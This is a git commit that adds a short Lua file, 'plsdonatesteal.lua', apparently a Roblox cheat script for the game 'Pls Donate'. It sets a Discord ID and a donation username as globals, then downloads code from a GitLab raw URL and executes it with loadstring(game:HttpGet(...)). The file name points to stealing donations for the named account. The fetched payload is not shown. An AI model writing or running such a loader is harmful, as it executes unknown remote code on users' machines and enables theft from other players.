c56faf533757d919835d0264e80bc7ed52960ab5
rainingsunrblx-hash <rainingsunrblx@gmail.com>
2026-02-12 12:35:04 +0530

    Create plsdonatesteal.lua

---
+++ plsdonatesteal.lua
@@ -0,0 +1,3 @@
+getgenv().DiscordID = "1109372132279992360"
+getgenv().DonationUsername = "Baconbloxer8"
+local Speed = loadstring(game:HttpGet("https://gitlab.com/moziiontopp-group/MoziIOnTopp-project/-/raw/main/PlisSpeed.txt"))()
